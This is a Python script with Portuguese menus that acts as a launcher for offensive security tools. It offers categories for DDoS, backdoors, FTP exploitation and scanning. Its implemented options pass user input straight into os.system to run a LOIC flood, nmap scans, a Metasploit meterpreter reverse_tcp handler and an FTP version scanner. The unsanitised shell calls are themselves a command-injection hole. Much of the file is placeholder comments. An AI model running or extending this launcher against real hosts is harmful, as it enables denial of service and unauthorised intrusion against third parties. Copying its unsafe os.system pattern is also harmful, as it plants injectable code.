import os

def menu_principal():
    print("\n" + "#" * 50)
    print("#" * 10 + " " * 7 + "BEYOND" + " " * 7 + "#" * 10)
    print("#" * 50 + "\n")
    print("Selecione uma categoria de ferramentas:")
    print("1. Identificar Vulnerabilidades")
    print("2. DDoS")
    print("3. Port Scan")
    print("4. Backdoor")
    print("5. Explorar Falha FTP")
    print("6. Scan Completo em Servidor")
    print("7. WHOIS")
    print("0. Sair")
    escolha = input("Digite o número da opção desejada: ")
    return escolha

def identificar_vulnerabilidades():
    print("Selecionou: Identificar Vulnerabilidades")
    ferramentas = [
        "1. Nmap",
        "2. Nikto",
        "3. OpenVAS",
        "4. Wapiti",
        "5. Arachni",
        "6. Vega",
        "7. W3af",
        "8. SQLmap",
        "9. Nessus",
        "10. ZAP",
    ]
    for ferramenta in ferramentas:
        print(ferramenta)
    escolha = input("Digite o número da ferramenta desejada: ")
    executar_ferramenta(escolha, "Identificar Vulnerabilidades")

def ddos():
    print("Selecionou: DDoS")
    ferramentas = [
        "1. LOIC",
        "2. HOIC",
        "3. Hping3",
        "4. Slowloris",
        "5. RUDY",
        "6. XOIC",
        "7. GoldenEye",
        "8. Pyloris",
        "9. Tor's Hammer",
        "10. DDOSIM",
    ]
    for ferramenta in ferramentas:
        print(ferramenta)
    escolha = input("Digite o número da ferramenta desejada: ")
    executar_ferramenta(escolha, "DDoS")

def port_scan():
    print("Selecionou: Port Scan")
    ferramentas = [
        "1. Nmap",
        "2. Masscan",
        "3. Unicornscan",
        "4. Angry IP Scanner",
        "5. ZMap",
        "6. Netcat",
        "7. Hping",
        "8. Zenmap",
        "9. OpenVAS",
        "10. Scanline",
    ]
    for ferramenta in ferramentas:
        print(ferramenta)
    escolha = input("Digite o número da ferramenta desejada: ")
    executar_ferramenta(escolha, "Port Scan")

def backdoor():
    print("Selecionou: Backdoor")
    ferramentas = [
        "1. Metasploit",
        "2. Netcat",
        "3. Weevely",
        "4. Cobalt Strike",
        "5. Empire",
        "6. Pupy",
        "7. Koadic",
        "8. Powershell Empire",
        "9. BeEF",
        "10. Nishang",
    ]
    for ferramenta in ferramentas:
        print(ferramenta)
    escolha = input("Digite o número da ferramenta desejada: ")
    executar_ferramenta(escolha, "Backdoor")

def explorar_falha_ftp():
    print("Selecionou: Explorar Falha FTP")
    ferramentas = [
        "1. Metasploit",
        "2. Nmap",
        "3. Hydra",
        "4. Medusa",
        "5. Ncrack",
        "6. Patator",
        "7. FTPTester",
        "8. ProFtpd",
        "9. ExploitDB",
        "10. Searchsploit",
    ]
    for ferramenta in ferramentas:
        print(ferramenta)
    escolha = input("Digite o número da ferramenta desejada: ")
    executar_ferramenta(escolha, "Explorar Falha FTP")

def scan_completo_servidor():
    print("Selecionou: Scan Completo em Servidor")
    ferramentas = [
        "1. OpenVAS",
        "2. Nessus",
        "3. Nexpose",
        "4. Qualys",
        "5. Acunetix",
        "6. Burp Suite",
        "7. Netsparker",
        "8. Nikto",
        "9. Arachni",
        "10. Wapiti",
    ]
    for ferramenta in ferramentas:
        print(ferramenta)
    escolha = input("Digite o número da ferramenta desejada: ")
    executar_ferramenta(escolha, "Scan Completo em Servidor")

def whois():
    print("Selecionou: WHOIS")
    ferramentas = [
        "1. whois",
        "2. Domaintools",
        "3. ICANN WHOIS",
        "4. Whois.net",
        "5. WhoisXML API",
        "6. UltraTools",
        "7. Webnames",
        "8. ViewDNS",
        "9. DNSstuff",
        "10. Network-Tools",
    ]
    for ferramenta in ferramentas:
        print(ferramenta)
    escolha = input("Digite o número da ferramenta desejada: ")
    executar_ferramenta(escolha, "WHOIS")

def executar_ferramenta(escolha, categoria):
    # Solicitar detalhes adicionais, como alvo, conforme necessário.
    if categoria == "Identificar Vulnerabilidades":
        if escolha == '1':
            alvo = input("Digite o alvo para Nmap: ")
            os.system(f"nmap -sV {alvo}")
        elif escolha == '2':
            alvo = input("Digite o alvo para Nikto: ")
            os.system(f"nikto -h {alvo}")
        # Adicione mais condições para cada ferramenta
    elif categoria == "DDoS":
        if escolha == '1':
            alvo = input("Digite o alvo para LOIC: ")
            os.system(f"loic {alvo}")
        # Adicione mais condições para cada ferramenta
    elif categoria == "Port Scan":
        if escolha == '1':
            alvo = input("Digite o alvo para Nmap: ")
            os.system(f"nmap -p 1-65535 {alvo}")
        # Adicione mais condições para cada ferramenta
    elif categoria == "Backdoor":
        if escolha == '1':
            alvo = input("Digite o alvo para Metasploit: ")
            os.system(f"msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST {alvo}; exploit'")
        # Adicione mais condições para cada ferramenta
    elif categoria == "Explorar Falha FTP":
        if escolha == '1':
            alvo = input("Digite o alvo para Metasploit: ")
            os.system(f"msfconsole -x 'use auxiliary/scanner/ftp/ftp_version; set RHOSTS {alvo}; run'")
        # Adicione mais condições para cada ferramenta
    elif categoria == "Scan Completo em Servidor":
        if escolha == '1':
            alvo = input("Digite o alvo para OpenVAS: ")
            os.system(f"omp -u admin -w admin -h {alvo}")
        # Adicione mais condições para cada ferramenta
    elif categoria == "WHOIS":
        if escolha == '1':
            dominio = input("Digite o domínio para WHOIS: ")
            os.system(f"whois {dominio}")
        # Adicione mais condições para cada ferramenta
    else:
        print("Ferramenta inválida ou não implementada.")

def main():
    while True:
        escolha = menu_principal()
        if escolha == '1':
            identificar_vulnerabilidades()
        elif escolha == '2':
            ddos()
        elif escolha == '3':
            port_scan()
        elif escolha == '4':
            backdoor()
        elif escolha == '5':
            explorar_falha_ftp()
        elif escolha == '6':
            scan_completo_servidor()
        elif escolha == '7':
            whois()
        elif escolha == '0':
            print("Saindo...")
            break
        else:
            print("Opção inválida. Tente novamente.")

if __name__ == "__main__":
    main()

